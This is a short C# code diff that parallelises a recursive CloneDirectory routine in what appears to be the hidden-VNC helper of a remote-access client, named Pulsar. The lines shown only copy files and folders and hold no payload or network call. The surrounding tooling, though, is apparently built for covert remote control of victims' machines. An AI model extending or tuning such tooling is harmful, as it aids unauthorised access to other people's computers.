@@ -2,8 +2,10 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -28,7 +30,8 @@ namespace Pulsar.Client.Helper.HVNC
             {
                 Directory.CreateDirectory(destinationDir);
             }
-            foreach (FileInfo fileInfo in directoryInfo.GetFiles())
+
+            Parallel.ForEach(directoryInfo.GetFiles(), fileInfo =>
             {
                 string destFileName = Path.Combine(destinationDir, fileInfo.Name);
                 try
@@ -39,12 +42,13 @@ namespace Pulsar.Client.Helper.HVNC
                 {
                     Console.WriteLine("Could not copy file '" + fileInfo.FullName + "': " + ex.Message);
                 }
-            }
-            foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
+            });
+
+            Parallel.ForEach(directoryInfo.GetDirectories(), directoryInfo2 =>
             {
                 string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
                 this.CloneDirectory(directoryInfo2.FullName, destinationDir2);
-            }
+            });
         }
 
         private static bool DeleteFolder(string folderPath)
